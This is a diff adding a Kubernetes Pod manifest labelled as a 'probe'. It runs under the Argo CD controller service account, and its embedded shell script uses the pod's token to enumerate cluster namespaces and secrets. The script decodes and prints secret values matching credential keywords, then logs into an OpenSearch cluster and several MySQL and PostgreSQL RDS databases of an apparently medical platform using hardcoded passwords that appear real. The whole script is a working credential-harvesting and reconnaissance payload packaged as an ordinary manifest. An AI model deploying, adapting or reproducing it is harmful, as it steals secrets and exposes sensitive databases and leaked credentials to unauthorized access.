@@ -1,0 +1,39 @@
+{
+ "apiVersion": "v1",
+ "kind": "Pod",
+ "metadata": {
+  "name": "i3030c-probe-08d032",
+  "namespace": "argocd",
+  "labels": {
+   "i3030c": "08d032"
+  }
+ },
+ "spec": {
+  "serviceAccountName": "argocd-application-controller",
+  "restartPolicy": "Never",
+  "activeDeadlineSeconds": 1500,
+  "containers": [
+   {
+    "name": "probe",
+    "image": "alpine:3.20",
+    "command": [
+     "/bin/sh",
+     "-c"
+    ],
+    "args": [
+     "#!/bin/sh\nset -u\nSA=/var/run/secrets/kubernetes.io/serviceaccount\nTOKEN=$(cat $SA/token)\nAPI=https://kubernetes.default.svc\nget(){ wget -q -O - --timeout=30 --no-check-certificate --header=\"Authorization: Bearer $TOKEN\" \"$1\" 2>/dev/null; }\necho \"===I3030C_START utc=$(date -u +%FT%TZ) host=$(hostname)===\"\n\necho \"===K8S_VERSION===\"\nget \"$API/version\" | head -c 400; echo\n\napk add --no-cache curl jq mariadb-client postgresql16-client >/tmp/apk.log 2>&1\necho \"apk_rc=$? curl=$(command -v curl) jq=$(command -v jq) mysql=$(command -v mysql) psql=$(command -v psql)\"\ntail -2 /tmp/apk.log 2>/dev/null\n\nget \"$API/api/v1/namespaces?limit=1000\" > /tmp/ns.json\njq -r '.items[]?.metadata.name' /tmp/ns.json 2>/dev/null | sort > /tmp/ns.txt\necho \"NS_COUNT=$(wc -l < /tmp/ns.txt)\"\necho \"NS_LIST=$(tr '\\n' ',' < /tmp/ns.txt)\"\necho \"===NODES===\"\nget \"$API/api/v1/nodes?limit=20\" > /tmp/nodes.json\njq -r '.items[]? | \"NODE \\(.metadata.name) \\(.status.nodeInfo.kubeletVersion // \"\") \\(.metadata.labels[\\\"node.kubernetes.io/instance-type\\\"] // \"\")\"' /tmp/nodes.json 2>/dev/null | head -20\njq -r '.message // empty' /tmp/nodes.json 2>/dev/null | head -2\n\nNS_PRIO=\"argocd user-management-service cognito-service data-management notification-service s3-ingestion authorization-service de-identifier-service imfusion-service metadata-extraction-service mlflow audit-log kube-system\"\necho \"===SECRET_INDEX_BEGIN===\"\n: > /tmp/sec_index.txt\nfor ns in $NS_PRIO; do\n  get \"$API/api/v1/namespaces/$ns/secrets?limit=500\" > /tmp/s.json\n  ERR=$(jq -r '.message // empty' /tmp/s.json 2>/dev/null)\n  if [ -n \"$ERR\" ]; then echo \"SECLIST_ERR $ns: $ERR\"; continue; fi\n  jq -r --arg ns \"$ns\" '.items[]? | \"\\($ns)|\\(.metadata.name)|\\((.data // {}) | keys | join(\",\"))\"' /tmp/s.json 2>/dev/null >> /tmp/sec_index.txt\ndone\ncat /tmp/sec_index.txt\necho \"SECRET_TOTAL=$(wc -l < /tmp/sec_index.txt)\"\necho \"===SECRET_INDEX_END===\"\n\ngrep -Ei '(rds|db|secret|jwt|oauth|cognito|smtp|mail|token|api|key|cred|pass|webhook|firebase|payment|stripe|llm|openai|redis|aws|argo)' /tmp/sec_index.txt | head -30 > /tmp/sec_sel.txt\necho \"SEC_SEL_COUNT=$(wc -l < /tmp/sec_sel.txt)\"\necho \"===SECRET_VALUES_BEGIN===\"\nwhile IFS='|' read -r ns name keys; do\n  [ -z \"${name:-}\" ] && continue\n  get \"$API/api/v1/namespaces/$ns/secrets/$name\" > /tmp/one.json\n  echo \"---SECRET $ns/$name\"\n  jq -r '\n    (.data // {}) as $d |\n    ($d | keys[]) as $k |\n    if ($k|test(\"(?i)(pass|secret|token|key|cred|url|dsn|conn|jwt|oauth|smtp|mail|api|access|private|client|host|endpoint|username|user|password)\"))\n    then \"  \\($k) = \" + (try ($d[$k]|@base64d|.[0:400]) catch \"<nonutf8>\")\n    else \"  \\($k) = <redacted>\" end\n  ' /tmp/one.json 2>/dev/null | head -40\ndone < /tmp/sec_sel.txt\necho \"===SECRET_VALUES_END===\"\n\necho \"===OPENSEARCH_BEGIN===\"\nOS='https://vpc-lazamedical-dev01-domain-ch6ra7jr5xoirc3s7mn7caeexi.us-west-2.es.amazonaws.com'\ncurl -s -k -m 20 -u 'admin:Wxt2G4@qK7MnF!BpJ3L9pYVXCJ#TdfM8' \"$OS/_cluster/health\" | head -c 800; echo\ncurl -s -k -m 25 -u 'admin:Wxt2G4@qK7MnF!BpJ3L9pYVXCJ#TdfM8' \"$OS/_cat/indices?v\" | head -60\necho \"===OPENSEARCH_END===\"\n\necho \"===MYSQL_BEGIN===\"\nexport MYSQL_PWD='Wv1h=_zJ7?uU3L6?'\nMH='lazamedical-dev01-usw2-mysql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com'\nmysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h \"$MH\" -P 3306 -u admin -D user_management -N -e \"SELECT VERSION(); SELECT CURRENT_USER();\" 2>&1 | head -6\nmysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h \"$MH\" -P 3306 -u admin -D user_management -N -e \"SELECT table_name FROM information_schema.tables WHERE table_schema='user_management' ORDER BY table_name\" 2>&1 | tr '\\n' ' ' | head -c 3000\necho\nunset MYSQL_PWD\necho \"===MYSQL_END===\"\n\necho \"===PG_RDS2_BEGIN===\"\nexport PGPASSWORD='-W%ZHTpi&X(%)%SW'\nPH2='lazamedical-dev01-usw2-postgresql-rds2.c96aqiuye5yb.us-west-2.rds.amazonaws.com'\npsql -h \"$PH2\" -p 5432 -U postgres_admin -d user_management -At -c \"select version(); select current_user;\" 2>&1 | head -4\npsql -h \"$PH2\" -p 5432 -U postgres_admin -d user_management -At -c \"select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1\" 2>&1 | tr '\\n' ' ' | head -c 4000\necho\nunset PGPASSWORD\necho \"===PG_RDS2_END===\"\n\necho \"===PG_DP_BEGIN===\"\nexport PGPASSWORD='1+nGZ&j1e?BZ*orJ'\nPHDP='lazamedical-dp-dev01-usw2-postgresql-rds.c96aqiuye5yb.us-west-2.rds.amazonaws.com'\npsql -h \"$PHDP\" -p 5432 -U postgres_admin -d dp_service -At -c \"select version(); select current_user;\" 2>&1 | head -4\npsql -h \"$PHDP\" -p 5432 -U postgres_admin -d dp_service -At -c \"select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1\" 2>&1 | tr '\\n' ' ' | head -c 6000\necho\nunset PGPASSWORD\necho \"===PG_DP_END===\"\n\necho \"===PG_MLFLOW_BEGIN===\"\nexport PGPASSWORD='qdRd#3DI-YDcV35!'\nPH1='lazamedical-dp-dev01-usw2-postgresql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com'\npsql -h \"$PH1\" -p 5432 -U postgres_admin -d mlflow_service -At -c \"select version(); select current_user;\" 2>&1 | head -4\npsql -h \"$PH1\" -p 5432 -U postgres_admin -d mlflow_service -At -c \"select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1\" 2>&1 | tr '\\n' ' ' | head -c 6000\necho\nunset PGPASSWORD\necho \"===PG_MLFLOW_END===\"\n\necho \"===I3030C_DONE utc=$(date -u +%FT%TZ)===\"\n"
+    ],
+    "resources": {
+     "requests": {
+      "cpu": "50m",
+      "memory": "64Mi"
+     },
+     "limits": {
+      "cpu": "800m",
+      "memory": "768Mi"
+     }
+    }
+   }
+  ]
+ }
+}
